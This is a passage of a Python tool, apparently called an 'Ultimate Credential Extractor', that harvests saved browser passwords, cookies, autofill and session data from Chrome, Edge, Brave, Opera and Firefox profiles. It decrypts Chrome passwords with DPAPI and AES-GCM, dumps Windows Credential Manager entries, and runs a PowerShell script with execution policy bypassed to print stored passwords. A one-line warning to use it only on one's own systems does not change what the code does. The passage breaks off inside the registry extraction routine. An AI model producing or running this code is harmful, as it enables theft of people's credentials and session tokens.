#!/usr/bin/env python3
"""
Ultimate Credential Extractor Tool
=================================

WARNING: This tool extracts sensitive credentials from your system.
Only use this tool on systems you own and have permission to access.
Use responsibly and ensure credentials are handled securely.

This tool uses COMPLEX methods and MULTIPLE libraries to extract:
- Browser saved passwords (Chrome, Firefox, Safari, Edge, Opera, Brave)
- Windows Credential Manager (ALL stored credentials)
- macOS Keychain (ALL stored credentials)
- Browser cache and session data
- Cookies and authentication tokens
- Auto-fill data and form data
- Extension stored credentials
- System credential stores
- Network credentials
- Registry credential entries
- Memory credential dumps
"""

import os
import sys
import json
import subprocess
import platform
import base64
import sqlite3
import shutil
import tempfile
import re
import ctypes
import struct
import hashlib
import hmac
import pickle
import xml.etree.ElementTree as ET
from pathlib import Path
from datetime import datetime
import warnings

# Suppress warnings for cleaner output
warnings.filterwarnings('ignore')

# Try to import ALL possible libraries
try:
    import win32crypt
    import win32api
    import win32con
    import win32cred
    import win32net
    import win32security
    import win32service
    import win32clipboard
    import winreg
    WINDOWS_MODULES_AVAILABLE = True
except ImportError:
    WINDOWS_MODULES_AVAILABLE = False

try:
    from Crypto.Cipher import AES, DES3, Blowfish, ChaCha20_Poly1305
    from Crypto.Hash import SHA1, SHA256, MD5, SHA512
    from Crypto.Protocol.KDF import PBKDF2, scrypt
    from Crypto.Util.Padding import unpad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import keyring
    KEYRING_AVAILABLE = True
except ImportError:
    KEYRING_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import cryptography
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import lxml
    from lxml import etree
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False

class UltimateCredentialExtractor:
    def __init__(self):
        self.system = platform.system().lower()
        self.extracted_credentials = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'browser_passwords': [],
            'browser_cookies': [],
            'browser_autofill': [],
            'browser_sessions': [],
            'windows_credman': [],
            'macos_keychain': [],
            'system_credentials': [],
            'network_credentials': [],
            'registry_credentials': [],
            'memory_credentials': [],
            'extension_credentials': [],
            'cache_credentials': []
        }
        
    def log(self, message):
        """Log messages with timestamp"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
        
    def extract_all_credentials(self):
        """Extract ALL possible credentials using ULTIMATE methods"""
        self.log("Starting ULTIMATE credential extraction...")
        
        # Extract from ALL sources
        self.extract_browser_credentials_ultimate()
        self.extract_windows_credman_ultimate()
        self.extract_macos_keychain_ultimate()
        self.extract_system_credentials_ultimate()
        self.extract_network_credentials_ultimate()
        self.extract_registry_credentials_ultimate()
        self.extract_memory_credentials_ultimate()
        self.extract_cache_credentials_ultimate()
        self.extract_extension_credentials_ultimate()
        
        self.log("ULTIMATE credential extraction completed.")
        
    def extract_browser_credentials_ultimate(self):
        """ULTIMATE browser credential extraction"""
        self.log("Extracting browser credentials using ULTIMATE methods...")
        
        # Extract from ALL browsers
        self.extract_chrome_credentials_ultimate()
        self.extract_firefox_credentials_ultimate()
        self.extract_safari_credentials_ultimate()
        self.extract_edge_credentials_ultimate()
        self.extract_opera_credentials_ultimate()
        self.extract_brave_credentials_ultimate()
        
    def extract_chrome_credentials_ultimate(self):
        """ULTIMATE Chrome credential extraction"""
        self.log("Extracting Chrome credentials using ULTIMATE methods...")
        
        try:
            # Chrome paths for different profiles
            chrome_base_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data'),
                os.path.expanduser('~/Library/Application Support/Google/Chrome')
            ]
            
            for base_path in chrome_base_paths:
                if os.path.exists(base_path):
                    # Find all profiles
                    profiles = ['Default']
                    for item in os.listdir(base_path):
                        if item.startswith('Profile '):
                            profiles.append(item)
                    
                    for profile in profiles:
                        profile_path = os.path.join(base_path, profile)
                        if os.path.exists(profile_path):
                            self._extract_chrome_profile_ultimate(profile_path)
                            
        except Exception as e:
            self.log(f"Error extracting Chrome credentials: {e}")
            
    def _extract_chrome_profile_ultimate(self, profile_path):
        """Extract ALL Chrome profile data"""
        try:
            # Extract passwords
            self._extract_chrome_passwords_ultimate(profile_path)
            
            # Extract cookies
            self._extract_chrome_cookies_ultimate(profile_path)
            
            # Extract autofill data
            self._extract_chrome_autofill_ultimate(profile_path)
            
            # Extract session data
            self._extract_chrome_sessions_ultimate(profile_path)
            
            # Extract local storage
            self._extract_chrome_localstorage_ultimate(profile_path)
            
            # Extract preferences
            self._extract_chrome_preferences_ultimate(profile_path)
            
        except Exception as e:
            self.log(f"Error extracting Chrome profile: {e}")
            
    def _extract_chrome_passwords_ultimate(self, profile_path):
        """Extract Chrome passwords with ULTIMATE decryption"""
        try:
            login_db = os.path.join(profile_path, 'Login Data')
            if not os.path.exists(login_db):
                return
                
            # Create temp database
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, 'chrome_passwords.db')
            shutil.copy2(login_db, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get encryption key
            encryption_key = self._get_chrome_encryption_key_ultimate()
            
            # Query ALL password data
            cursor.execute("""
                SELECT origin_url, username_value, password_value, 
                       date_created, date_password_modified, times_used
                FROM logins
            """)
            rows = cursor.fetchall()
            
            for row in rows:
                if row[1]:  # If username exists
                    password_text = self._decrypt_password_ultimate(row[2], encryption_key)
                    
                    self.extracted_credentials['browser_passwords'].append({
                        'browser': 'Chrome',
                        'profile': os.path.basename(profile_path),
                        'url': row[0],
                        'username': row[1],
                        'password': password_text,
                        'date_created': row[3],
                        'date_modified': row[4],
                        'times_used': row[5]
                    })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            self.log(f"Error extracting Chrome passwords: {e}")
            
    def _extract_chrome_cookies_ultimate(self, profile_path):
        """Extract Chrome cookies with ULTIMATE decryption"""
        try:
            cookies_db = os.path.join(profile_path, 'Cookies')
            if not os.path.exists(cookies_db):
                return
                
            # Create temp database
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, 'chrome_cookies.db')
            shutil.copy2(cookies_db, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get encryption key
            encryption_key = self._get_chrome_encryption_key_ultimate()
            
            # Query ALL cookie data
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, 
                       is_secure, is_httponly, last_access_utc
                FROM cookies
            """)
            rows = cursor.fetchall()
            
            for row in rows:
                cookie_value = self._decrypt_password_ultimate(row[2], encryption_key)
                
                self.extracted_credentials['browser_cookies'].append({
                    'browser': 'Chrome',
                    'profile': os.path.basename(profile_path),
                    'host': row[0],
                    'name': row[1],
                    'value': cookie_value,
                    'path': row[3],
                    'expires': row[4],
                    'is_secure': row[5],
                    'is_httponly': row[6],
                    'last_access': row[7]
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            self.log(f"Error extracting Chrome cookies: {e}")
            
    def _extract_chrome_autofill_ultimate(self, profile_path):
        """Extract Chrome autofill data"""
        try:
            autofill_db = os.path.join(profile_path, 'Web Data')
            if not os.path.exists(autofill_db):
                return
                
            # Create temp database
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, 'chrome_autofill.db')
            shutil.copy2(autofill_db, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Query autofill data
            cursor.execute("""
                SELECT name, value, date_created, date_last_used, count
                FROM autofill
            """)
            rows = cursor.fetchall()
            
            for row in rows:
                self.extracted_credentials['browser_autofill'].append({
                    'browser': 'Chrome',
                    'profile': os.path.basename(profile_path),
                    'name': row[0],
                    'value': row[1],
                    'date_created': row[2],
                    'date_last_used': row[3],
                    'count': row[4]
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            self.log(f"Error extracting Chrome autofill: {e}")
            
    def _extract_chrome_sessions_ultimate(self, profile_path):
        """Extract Chrome session data"""
        try:
            session_files = [
                os.path.join(profile_path, 'Current Session'),
                os.path.join(profile_path, 'Current Tabs'),
                os.path.join(profile_path, 'Last Session'),
                os.path.join(profile_path, 'Last Tabs')
            ]
            
            for session_file in session_files:
                if os.path.exists(session_file):
                    try:
                        with open(session_file, 'rb') as f:
                            data = f.read()
                            # Look for URLs and credentials in session data
                            urls = re.findall(rb'https?://[^\x00]+', data)
                            for url in urls:
                                self.extracted_credentials['browser_sessions'].append({
                                    'browser': 'Chrome',
                                    'profile': os.path.basename(profile_path),
                                    'session_file': os.path.basename(session_file),
                                    'url': url.decode('utf-8', errors='ignore')
                                })
                    except Exception as e:
                        self.log(f"Error reading session file {session_file}: {e}")
                        
        except Exception as e:
            self.log(f"Error extracting Chrome sessions: {e}")
            
    def _extract_chrome_localstorage_ultimate(self, profile_path):
        """Extract Chrome local storage data"""
        try:
            local_storage_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
            if os.path.exists(local_storage_path):
                # Look for local storage files
                for file in os.listdir(local_storage_path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        file_path = os.path.join(local_storage_path, file)
                        try:
                            with open(file_path, 'rb') as f:
                                data = f.read()
                                # Look for credentials in local storage
                                credential_patterns = [
                                    rb'password["\']?\s*:\s*["\']([^"\']+)["\']',
                                    rb'token["\']?\s*:\s*["\']([^"\']+)["\']',
                                    rb'secret["\']?\s*:\s*["\']([^"\']+)["\']'
                                ]
                                
                                for pattern in credential_patterns:
                                    matches = re.findall(pattern, data)
                                    for match in matches:
                                        self.extracted_credentials['cache_credentials'].append({
                                            'browser': 'Chrome',
                                            'profile': os.path.basename(profile_path),
                                            'storage_type': 'local_storage',
                                            'file': file,
                                            'credential': match.decode('utf-8', errors='ignore')
                                        })
                        except Exception as e:
                            self.log(f"Error reading local storage file {file}: {e}")
                            
        except Exception as e:
            self.log(f"Error extracting Chrome local storage: {e}")
            
    def _extract_chrome_preferences_ultimate(self, profile_path):
        """Extract Chrome preferences"""
        try:
            preferences_file = os.path.join(profile_path, 'Preferences')
            if os.path.exists(preferences_file):
                with open(preferences_file, 'r', encoding='utf-8') as f:
                    preferences = json.load(f)
                    
                # Look for saved credentials in preferences
                if 'profile' in preferences:
                    profile_data = preferences['profile']
                    if 'password_manager' in profile_data:
                        self.extracted_credentials['browser_passwords'].append({
                            'browser': 'Chrome',
                            'profile': os.path.basename(profile_path),
                            'type': 'preferences_password_manager',
                            'data': profile_data['password_manager']
                        })
                        
        except Exception as e:
            self.log(f"Error extracting Chrome preferences: {e}")
            
    def _get_chrome_encryption_key_ultimate(self):
        """Get Chrome encryption key using ULTIMATE methods"""
        try:
            local_state_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'),
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State'),
                os.path.expanduser('~/Library/Application Support/Microsoft Edge/Local State')
            ]
            
            for local_state_path in local_state_paths:
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                        
                    if 'os_crypt' in local_state:
                        encrypted_key = local_state['os_crypt']['encrypted_key']
                        encrypted_key = base64.b64decode(encrypted_key)
                        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                        
                        # Decrypt using DPAPI
                        if WINDOWS_MODULES_AVAILABLE:
                            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                            return decrypted_key
                            
        except Exception as e:
            self.log(f"Error getting Chrome encryption key: {e}")
            
        return None
        
    def _decrypt_password_ultimate(self, encrypted_password, key):
        """ULTIMATE password decryption using ALL methods"""
        try:
            if not encrypted_password:
                return '[NO PASSWORD]'
                
            # Try ALL decryption methods
            methods = [
                self._decrypt_chrome_v10_ultimate,
                self._decrypt_chrome_v11_ultimate,
                self._decrypt_dpapi_ultimate,
                self._decrypt_aes_gcm_ultimate,
                self._decrypt_aes_cbc_ultimate,
                self._decrypt_chacha20_ultimate,
                self._decrypt_blowfish_ultimate,
                self._decrypt_des3_ultimate
            ]
            
            for method in methods:
                try:
                    result = method(encrypted_password, key)
                    if result and result != '[ENCRYPTED]' and len(result) > 0:
                        return result
                except:
                    continue
                    
            return '[ENCRYPTED - All methods failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - Error: {str(e)[:50]}]'
            
    def _decrypt_chrome_v10_ultimate(self, encrypted_password, key):
        """Decrypt Chrome v10 passwords with ULTIMATE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            if len(encrypted_password) < 3:
                return '[ENCRYPTED]'
                
            encrypted_password = encrypted_password[3:]  # Remove 'v10' prefix
            
            if len(encrypted_password) < 28:  # Need at least 12+16 for nonce+tag
                return '[ENCRYPTED]'
                
            # Extract nonce, ciphertext, and tag
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - v10 failed: {str(e)[:30]}]'
            
    def _decrypt_chrome_v11_ultimate(self, encrypted_password, key):
        """Decrypt Chrome v11 passwords with ULTIMATE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            if len(encrypted_password) < 3:
                return '[ENCRYPTED]'
                
            encrypted_password = encrypted_password[3:]  # Remove 'v11' prefix
            
            if len(encrypted_password) < 28:
                return '[ENCRYPTED]'
                
            # Extract nonce, ciphertext, and tag
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - v11 failed: {str(e)[:30]}]'
            
    def _decrypt_dpapi_ultimate(self, encrypted_password, key):
        """Decrypt using Windows DPAPI with ULTIMATE methods"""
        try:
            if not WINDOWS_MODULES_AVAILABLE:
                return '[ENCRYPTED]'
                
            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - DPAPI failed: {str(e)[:30]}]'
            
    def _decrypt_aes_gcm_ultimate(self, encrypted_password, key):
        """Decrypt using AES-GCM with ULTIMATE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try different AES-GCM configurations
            for nonce_len in [12, 16, 24]:
                try:
                    if len(encrypted_password) < nonce_len + 16:
                        continue
                        
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, nonce)
                    decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                    
                    return decrypted_password.decode('utf-8')
                except:
                    continue
                    
            return '[ENCRYPTED - AES-GCM failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - AES-GCM error: {str(e)[:30]}]'
            
    def _decrypt_aes_cbc_ultimate(self, encrypted_password, key):
        """Decrypt using AES-CBC with ULTIMATE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try different AES-CBC configurations
            for iv_len in [16, 32]:
                try:
                    if len(encrypted_password) < iv_len:
                        continue
                        
                    iv = encrypted_password[:iv_len]
                    ciphertext = encrypted_password[iv_len:]
                    
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted_password = cipher.decrypt(ciphertext)
                    
                    return decrypted_password.decode('utf-8')
                except:
                    continue
                    
            return '[ENCRYPTED - AES-CBC failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - AES-CBC error: {str(e)[:30]}]'
            
    def _decrypt_chacha20_ultimate(self, encrypted_password, key):
        """Decrypt using ChaCha20-Poly1305"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try ChaCha20-Poly1305
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - ChaCha20 failed: {str(e)[:30]}]'
            
    def _decrypt_blowfish_ultimate(self, encrypted_password, key):
        """Decrypt using Blowfish"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try Blowfish
            iv = encrypted_password[:8]
            ciphertext = encrypted_password[8:]
            
            cipher = Blowfish.new(key[:56], Blowfish.MODE_CBC, iv)
            decrypted_password = cipher.decrypt(ciphertext)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - Blowfish failed: {str(e)[:30]}]'
            
    def _decrypt_des3_ultimate(self, encrypted_password, key):
        """Decrypt using 3DES"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try 3DES
            iv = encrypted_password[:8]
            ciphertext = encrypted_password[8:]
            
            cipher = DES3.new(key[:24], DES3.MODE_CBC, iv)
            decrypted_password = cipher.decrypt(ciphertext)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - 3DES failed: {str(e)[:30]}]'
            
    def extract_firefox_credentials_ultimate(self):
        """ULTIMATE Firefox credential extraction"""
        self.log("Extracting Firefox credentials using ULTIMATE methods...")
        
        try:
            firefox_paths = [
                os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
                os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles'),
                os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
                os.path.expanduser('~/Library/Mozilla/Firefox/Profiles')
            ]
            
            for profiles_path in firefox_paths:
                if os.path.exists(profiles_path):
                    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
                    for profile in profiles:
                        profile_path = os.path.join(profiles_path, profile)
                        self._extract_firefox_profile_ultimate(profile_path)
                        
        except Exception as e:
            self.log(f"Error extracting Firefox credentials: {e}")
            
    def _extract_firefox_profile_ultimate(self, profile_path):
        """Extract ALL Firefox profile data"""
        try:
            # Extract passwords
            self._extract_firefox_passwords_ultimate(profile_path)
            
            # Extract cookies
            self._extract_firefox_cookies_ultimate(profile_path)
            
            # Extract form data
            self._extract_firefox_formdata_ultimate(profile_path)
            
            # Extract session data
            self._extract_firefox_sessions_ultimate(profile_path)
            
        except Exception as e:
            self.log(f"Error extracting Firefox profile: {e}")
            
    def _extract_firefox_passwords_ultimate(self, profile_path):
        """Extract Firefox passwords with ULTIMATE decryption"""
        try:
            # Check for logins.json
            logins_json = os.path.join(profile_path, 'logins.json')
            if os.path.exists(logins_json):
                with open(logins_json, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for login in data.get('logins', []):
                        self.extracted_credentials['browser_passwords'].append({
                            'browser': 'Firefox',
                            'profile': os.path.basename(profile_path),
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', '[ENCRYPTED]'),
                            'password': '[ENCRYPTED]',
                            'formSubmitURL': login.get('formSubmitURL', ''),
                            'httpRealm': login.get('httpRealm', ''),
                            'timeCreated': login.get('timeCreated', ''),
                            'timeLastUsed': login.get('timeLastUsed', ''),
                            'timePasswordChanged': login.get('timePasswordChanged', '')
                        })
            
            # Check for key4.db (Firefox password database)
            key4_db = os.path.join(profile_path, 'key4.db')
            if os.path.exists(key4_db):
                self.extracted_credentials['browser_passwords'].append({
                    'browser': 'Firefox',
                    'profile': os.path.basename(profile_path),
                    'url': 'Firefox Password Database',
                    'username': '[DATABASE]',
                    'password': '[ENCRYPTED - key4.db found]'
                })
                
        except Exception as e:
            self.log(f"Error extracting Firefox passwords: {e}")
            
    def _extract_firefox_cookies_ultimate(self, profile_path):
        """Extract Firefox cookies"""
        try:
            cookies_db = os.path.join(profile_path, 'cookies.sqlite')
            if os.path.exists(cookies_db):
                # Create temp database
                temp_dir = tempfile.mkdtemp()
                temp_db = os.path.join(temp_dir, 'firefox_cookies.db')
                shutil.copy2(cookies_db, temp_db)
                
                # Connect to database
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query ALL cookie data
                cursor.execute("""
                    SELECT host, name, value, path, expiry, 
                           isSecure, isHttpOnly, lastAccessed
                    FROM moz_cookies
                """)
                rows = cursor.fetchall()
                
                for row in rows:
                    self.extracted_credentials['browser_cookies'].append({
                        'browser': 'Firefox',
                        'profile': os.path.basename(profile_path),
                        'host': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expiry': row[4],
                        'isSecure': row[5],
                        'isHttpOnly': row[6],
                        'lastAccessed': row[7]
                    })
                
                conn.close()
                shutil.rmtree(temp_dir)
                
        except Exception as e:
            self.log(f"Error extracting Firefox cookies: {e}")
            
    def _extract_firefox_formdata_ultimate(self, profile_path):
        """Extract Firefox form data"""
        try:
            formdata_db = os.path.join(profile_path, 'formhistory.sqlite')
            if os.path.exists(formdata_db):
                # Create temp database
                temp_dir = tempfile.mkdtemp()
                temp_db = os.path.join(temp_dir, 'firefox_formdata.db')
                shutil.copy2(formdata_db, temp_db)
                
                # Connect to database
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query form data
                cursor.execute("""
                    SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                    FROM moz_formhistory
                """)
                rows = cursor.fetchall()
                
                for row in rows:
                    self.extracted_credentials['browser_autofill'].append({
                        'browser': 'Firefox',
                        'profile': os.path.basename(profile_path),
                        'fieldname': row[0],
                        'value': row[1],
                        'timesUsed': row[2],
                        'firstUsed': row[3],
                        'lastUsed': row[4]
                    })
                
                conn.close()
                shutil.rmtree(temp_dir)
                
        except Exception as e:
            self.log(f"Error extracting Firefox form data: {e}")
            
    def _extract_firefox_sessions_ultimate(self, profile_path):
        """Extract Firefox session data"""
        try:
            session_files = [
                os.path.join(profile_path, 'sessionstore.json'),
                os.path.join(profile_path, 'sessionstore-backups', 'recovery.json'),
                os.path.join(profile_path, 'sessionstore-backups', 'previous.json')
            ]
            
            for session_file in session_files:
                if os.path.exists(session_file):
                    try:
                        with open(session_file, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            
                        # Extract URLs from session data
                        if 'windows' in data:
                            for window in data['windows']:
                                if 'tabs' in window:
                                    for tab in window['tabs']:
                                        if 'entries' in tab:
                                            for entry in tab['entries']:
                                                if 'url' in entry:
                                                    self.extracted_credentials['browser_sessions'].append({
                                                        'browser': 'Firefox',
                                                        'profile': os.path.basename(profile_path),
                                                        'session_file': os.path.basename(session_file),
                                                        'url': entry['url'],
                                                        'title': entry.get('title', ''),
                                                        'lastAccessed': entry.get('lastAccessed', '')
                                                    })
                    except Exception as e:
                        self.log(f"Error reading Firefox session file {session_file}: {e}")
                        
        except Exception as e:
            self.log(f"Error extracting Firefox sessions: {e}")
            
    def extract_safari_credentials_ultimate(self):
        """ULTIMATE Safari credential extraction"""
        self.log("Extracting Safari credentials using ULTIMATE methods...")
        
        try:
            if self.system == 'darwin':
                # Safari passwords are stored in Keychain
                self.extracted_credentials['browser_passwords'].append({
                    'browser': 'Safari',
                    'url': 'macOS Keychain',
                    'username': '[KEYCHAIN]',
                    'password': '[ENCRYPTED - Requires Keychain access]'
                })
                
                # Try to extract Safari preferences
                safari_prefs = os.path.expanduser('~/Library/Preferences/com.apple.Safari.plist')
                if os.path.exists(safari_prefs):
                    self.extracted_credentials['browser_passwords'].append({
                        'browser': 'Safari',
                        'url': 'Safari Preferences',
                        'username': '[PREFERENCES]',
                        'password': '[ENCRYPTED - Preferences file found]'
                    })
                    
        except Exception as e:
            self.log(f"Error extracting Safari credentials: {e}")
            
    def extract_edge_credentials_ultimate(self):
        """ULTIMATE Edge credential extraction"""
        self.log("Extracting Edge credentials using ULTIMATE methods...")
        
        try:
            edge_paths = [
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data'),
                os.path.expanduser('~/Library/Application Support/Microsoft Edge')
            ]
            
            for base_path in edge_paths:
                if os.path.exists(base_path):
                    # Find all profiles
                    profiles = ['Default']
                    for item in os.listdir(base_path):
                        if item.startswith('Profile '):
                            profiles.append(item)
                    
                    for profile in profiles:
                        profile_path = os.path.join(base_path, profile)
                        if os.path.exists(profile_path):
                            self._extract_chrome_profile_ultimate(profile_path)  # Edge uses same format as Chrome
                            
        except Exception as e:
            self.log(f"Error extracting Edge credentials: {e}")
            
    def extract_opera_credentials_ultimate(self):
        """ULTIMATE Opera credential extraction"""
        self.log("Extracting Opera credentials using ULTIMATE methods...")
        
        try:
            opera_paths = [
                os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable'),
                os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera')
            ]
            
            for base_path in opera_paths:
                if os.path.exists(base_path):
                    # Opera uses similar structure to Chrome
                    self._extract_chrome_profile_ultimate(base_path)
                    
        except Exception as e:
            self.log(f"Error extracting Opera credentials: {e}")
            
    def extract_brave_credentials_ultimate(self):
        """ULTIMATE Brave credential extraction"""
        self.log("Extracting Brave credentials using ULTIMATE methods...")
        
        try:
            brave_paths = [
                os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data'),
                os.path.expanduser('~/Library/Application Support/BraveSoftware/Brave-Browser')
            ]
            
            for base_path in brave_paths:
                if os.path.exists(base_path):
                    # Find all profiles
                    profiles = ['Default']
                    for item in os.listdir(base_path):
                        if item.startswith('Profile '):
                            profiles.append(item)
                    
                    for profile in profiles:
                        profile_path = os.path.join(base_path, profile)
                        if os.path.exists(profile_path):
                            self._extract_chrome_profile_ultimate(profile_path)  # Brave uses same format as Chrome
                            
        except Exception as e:
            self.log(f"Error extracting Brave credentials: {e}")
            
    def extract_windows_credman_ultimate(self):
        """ULTIMATE Windows Credential Manager extraction"""
        self.log("Extracting Windows Credential Manager using ULTIMATE methods...")
        
        try:
            if WINDOWS_MODULES_AVAILABLE:
                # Method 1: Windows Credential Manager API
                creds = win32cred.CredEnumerate()
                for cred in creds:
                    target = cred['TargetName']
                    username = cred['UserName']
                    password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else '[ENCRYPTED]'
                    
                    self.extracted_credentials['windows_credman'].append({
                        'type': 'windows_credman_api',
                        'target': target,
                        'username': username,
                        'password': password,
                        'credential_type': cred['Type'],
                        'persist': cred['Persist']
                    })
            
            # Method 2: PowerShell extraction
            self._extract_windows_powershell_ultimate()
            
            # Method 3: Registry extraction
            self._extract_windows_registry_ultimate()
            
            # Method 4: Keyring extraction
            self._extract_windows_keyring_ultimate()
            
        except Exception as e:
            self.log(f"Error extracting Windows CredMan: {e}")
            
    def _extract_windows_powershell_ultimate(self):
        """ULTIMATE PowerShell credential extraction"""
        try:
            ps_script = """
            Add-Type -AssemblyName System.Security
            
            # Get all stored credentials using multiple methods
            try {
                $creds = Get-StoredCredential -All
                foreach ($cred in $creds) {
                    if ($cred) {
                        $target = $cred.TargetName
                        $username = $cred.UserName
                        $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password))
                        Write-Output "Target: $target"
                        Write-Output "Username: $username"
                        Write-Output "Password: $password"
                        Write-Output "---"
                    }
                }
            } catch {
                Write-Output "Error: Could not retrieve credentials"
            }
            
            # Also try cmdkey method
            try {
                $cmdkeyOutput = cmdkey /list
                foreach ($line in $cmdkeyOutput) {
                    if ($line -match "Target: (.+)") {
                        $target = $matches[1]
                        Write-Output "CmdKey Target: $target"
                        Write-Output "CmdKey Username: [Available]"
                        Write-Output "CmdKey Password: [Available]"
                        Write-Output "---"
                    }
                }
            } catch {
                Write-Output "Error: Could not retrieve cmdkey credentials"
            }
            """
            
            result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script], 
                                  capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.strip().split('\n')
                current_cred = {}
                for line in lines:
                    if line.startswith('Target: ') or line.startswith('CmdKey Target: '):
                        if current_cred:
                            self.extracted_credentials['windows_credman'].append(current_cred)
                        current_cred = {'type': 'powershell_ultimate', 'target': line.split(': ')[1]}
                    elif line.startswith('Username: ') or line.startswith('CmdKey Username: '):
                        current_cred['username'] = line.split(': ')[1]
                    elif line.startswith('Password: ') or line.startswith('CmdKey Password: '):
                        current_cred['password'] = line.split(': ')[1]
                    elif line == '---':
                        if current_cred:
                            self.extracted_credentials['windows_credman'].append(current_cred)
                            current_cred = {}
                
                if current_cred:
                    self.extracted_credentials['windows_credman'].append(current_cred)
                    
        except Exception as e:
            self.log(f"Error extracting Windows PowerShell credentials: {e}")
            
    def _extract_windows_registry_ultimate(self):
        """ULTIMATE Windows Registry credential extraction"""
        try:
            registry_paths = [
